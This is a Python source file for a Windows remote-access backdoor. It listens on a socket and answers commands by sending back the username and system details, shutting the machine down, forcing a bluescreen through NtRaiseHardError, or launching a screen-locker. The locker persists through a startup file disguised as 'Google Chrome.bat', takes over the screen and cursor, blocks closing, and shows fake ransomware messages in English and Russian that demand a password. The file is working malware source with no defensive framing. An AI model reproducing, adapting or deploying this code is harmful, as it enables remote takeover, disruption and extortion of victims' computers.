import csv
import socket
import threading
import os
import getpass
import platform,socket,re,uuid,json,psutil,logging
import subprocess
import win32api 
import win32gui 
from ctypes import *
import win32ui 
import win32con 
import ctypes 
from tkinter import *
import math 
from random import * 
import random 
from time import sleep
import winsound 
import colorama
import time
from colorama import *
import ctypes
import pygame
import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
from time import sleep
from ctypes import *
MAX_TOTAL_LENGTH = 10000
address = "address"
port = 1234
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (address, port)
server_socket.bind(server_address)
def crash():
    USER_NAME = getpass.getuser()
    nullptr = POINTER(c_int) ()
    window = Tk()
    window.title("GG BRO")  
    window.geometry('400x250')
    window['bg'] = 'black'
    normal_width = 1920
    normal_height = 1080
    entired = False
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    percentage_width = screen_width / (normal_width / 100)
    percentage_height = screen_height / (normal_height / 100)
    scale_factor = ((percentage_width + percentage_height) / 2) / 100
    fontsize = int(20 * scale_factor)
    minimum_size = 10
    if fontsize < minimum_size:
        fontsize = minimum_size

    fontsizeHding = int(72 * scale_factor)
    minimum_size = 40
    if fontsizeHding < minimum_size:
        fontsizeHding = minimum_size
    default_style = ttk.Style()
    default_style.configure('New.TButton', font=("Helvetica", fontsize))


    def add_to_startup(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

    def block():
        pyautogui.FAILSAFE = False
        pyautogui.moveTo(x=680,y=800)
        window.protocol("WM_DELETE_WINDOW",block)
        window.update()

    def fullscreen():
        window.attributes('-fullscreen', True, '-topmost', True)

    def clicked():
        res = format(txt.get())
        if res == '1234':
            file_path = '/tmp/file.txt'
            file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
            os.remove(file_path)
            entired = True
            time.sleep(5)
            sys.exit()
            
    user32 = ctypes.windll.user32 
    user32.SetProcessDPIAware() 
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]  
    desktop = win32gui.GetDesktopWindow() 
    hdc = win32gui.GetDC(0) 
    user32 = ctypes.windll.user32 
    user32.SetProcessDPIAware() 
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    hdc = win32gui.GetWindowDC(desktop) 
    sw = win32api.GetSystemMetrics(0) 
    sh = win32api.GetSystemMetrics(1) 
    desk = win32gui.GetDC(0) 
    desc = win32gui.GetDC(0) 
    xx = win32api.GetSystemMetrics(0) 
    yy = win32api.GetSystemMetrics(1) 
    user32 = ctypes.windll.user32 
    user32.SetProcessDPIAware() 
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]  
    hdc = win32gui.GetDC(0) 
    dx = dy = 1 
    angle = 0 
    size = 1 
    speed = 40 
    sleep(1) 
    for i in range(int(sw + sh)): 
            win32api.SetCursorPos((random.randint(1,1000),random.randint(1,1000)))
            win32api.SetCursorPos((random.randint(1,1000),random.randint(1,1000)))
            a = int(math.sin(angle) * randrange(999))
            win32gui.BitBlt(hdc, randrange(99), i, sw, randrange(99), hdc, 0, i, win32con.SRCCOPY) 
            angle += math.pi / random.randint(10, 999) 
    win32gui.ReleaseDC(desktop, hdc) 
    time.sleep(0.1)
    tim = 250
    while tim != 0: 
        hdc = win32gui.GetDC(0) 
        color = (random.randint(0, 122), random.randint(0, 430), random.randint(0, 310)) 
        brush = win32gui.CreateSolidBrush(win32api.RGB(*color)) 

        win32api.SetCursorPos((random.randint(1,10000),random.randint(1,10000)))
        win32api.SetCursorPos((random.randint(1,10000),random.randint(1,10000)))

        win32gui.SelectObject(hdc, brush) 
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY) 
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT) 
        win32api.SetCursorPos((random.randint(1,10000),random.randint(1,10000)))
        win32api.SetCursorPos((random.randint(1,10000),random.randint(1,10000)))
        x = y = 0 
        win32gui.DrawIcon(hdc, random.randint(1,10000) , random.randint(1,10000) , win32gui.LoadIcon(None, win32con.IDI_WARNING))
        win32gui.DrawIcon(hdc, random.randint(1,10000) , random.randint(1,10000) , win32gui.LoadIcon(None, win32con.IDI_WINLOGO))
        win32gui.DrawIcon(hdc, random.randint(1,10000) , random.randint(1,10000) , win32gui.LoadIcon(None, win32con.IDI_ERROR))
        x = x + 30 
        if x >= w: 
            y = y + 30 
            x = 0 
        if y >= h: 
            x = y = 0 
        brush = win32gui.CreateSolidBrush(win32api.RGB( 
            randrange(255), 
            randrange(255), 
            randrange(255), 
            )) 
        win32gui.SelectObject(desc, brush) 
        win32gui.PatBlt(desc, randrange(xx), randrange(yy), randrange(xx), randrange(yy), win32con.PATINVERT) 
        win32gui.DeleteObject(brush) 
        win32api.SetCursorPos((random.randint(1,10000),random.randint(1,10000)))
        win32api.SetCursorPos((random.randint(1,10000),random.randint(1,10000)))
        sleep(0.01) 
        text = "Your data has been stealed" 
        size = size + 1 
        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY) 
        dx = math.ceil(math.sin(angle) * size * 10) 
        dy = math.ceil(math.cos(angle) * size * 10) 
        angle += speed / 10 
        win32gui.DrawText(desk, text, len(text), (randrange(xx), randrange(yy), randrange(xx), randrange(yy)), win32con.DT_LEFT) 
        win32gui.DrawText(desk, text, len(text), (randrange(xx), randrange(yy), randrange(xx), randrange(yy)), win32con.DT_LEFT) 
        if angle > math.pi : 
            angle = math.pi * -1
        m=win32gui.GetCursorPos()
        n=win32gui.GetCursorPos()
        dc = win32gui.GetDC(0)
        for i in range((n[0]-m[0])//4):
            win32gui.SetPixel(dc, m[0]+4*i, m[1], 0)
            win32gui.SetPixel(dc, m[0]+4*i, n[1], 0)
        for i in range((n[1]-m[1])//4):
            win32gui.SetPixel(dc, m[0], m[1]+4*i, 0)
            win32gui.SetPixel(dc, n[0], m[1]+4*i, 0)
        win32api.SetCursorPos((random.randint(1,10000),random.randint(1,10000)))
        win32api.SetCursorPos((random.randint(1,10000),random.randint(1,10000)))
        tim -= 1

    add_to_startup("C:\\myFiles\\main.py")
    fullscreen()

    txt_one = Label(window, text='GG', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
    txt_two = Label(window, text='Your data has been encrypted :(', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
    txt_three = Label(window, text='Ваш компьютер был заблокирован. Пожалуйста, введите пароль для получения доступа к компьютеру!', font=("Arial Bold", fontsize), fg='white', bg='black')

    txt_one.grid(column=0, row=0)
    txt_two.grid(column=0, row=0)
    txt_three.grid(column=0, row=0)

    txt_one.place(relx = .01, rely = .01)
    txt_two.place(relx = .01, rely = .11)
    txt_three.place(relx = .01, rely = .21)


    txt = Entry(window)  
    btn = Button(window, text="ВВОД КОДА", command=clicked)  
    txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
    btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)

    block()
    window.mainloop()

server_socket.listen(1)
while True:
    client_socket, client_address = server_socket.accept()
    data = client_socket.recv(1024)
    data = data.decode('utf-8', errors='ignore')
    if data == 'getname':
        user = getpass.getuser()
        client_socket.send(user.encode('utf-8'))
    else:
        args = data.split(" ")
        command = args[0].upper()
        value = args[1].upper()
        if command == '.GET':
            if value == 'SYSTEMINFO':
                result = f'''
platform: {platform.system()}
platform-release: {platform.release()}
platform-version: {platform.version()}
architecture: {platform.machine()}
hostname: {socket.gethostname()}
ip-address: {socket.gethostbyname(socket.gethostname())}
mac-address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
processor: {platform.processor()}
ram: {str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"}
'''
                client_socket.send(result.encode('utf-8'))
        elif command == '.SYSTEM':
            if value == 'SHUTDOWN':
                client_socket.send("\nSucces".encode('utf-8'))
                os.system("shutdown /s /t 1")
            elif value == 'CRASH':
                client_socket.send("\nSucces".encode('utf-8'))
                crash()
            elif value == 'BLUESCREEN':
                client_socket.send("\nSucces".encode('utf-8'))
                nullptr = POINTER(c_int)()
                windll.ntdll.RtlAdjustPrivilege(
                            c_uint(19),
                            c_uint(1),
                            c_uint(0),
                            byref(c_int())
                        )
                windll.ntdll.NtRaiseHardError(
                            c_ulong(0xC000007B),
                            c_ulong(0),
                            nullptr,
                            nullptr,
                            c_uint(6),
                            byref(c_uint())
                        )
        elif command == '.FUN': 
            if value == 'MSG':
                client_socket.send("\nSucces".encode('utf-8'))
                text = args[2]
                window = Tk()
                window.title("Message")
                window.geometry("250x250")
                lbl = Label(window, text=text, padx=100, pady=100)
                lbl.grid(column=0, row=0)
                window.update()
    client_socket.close()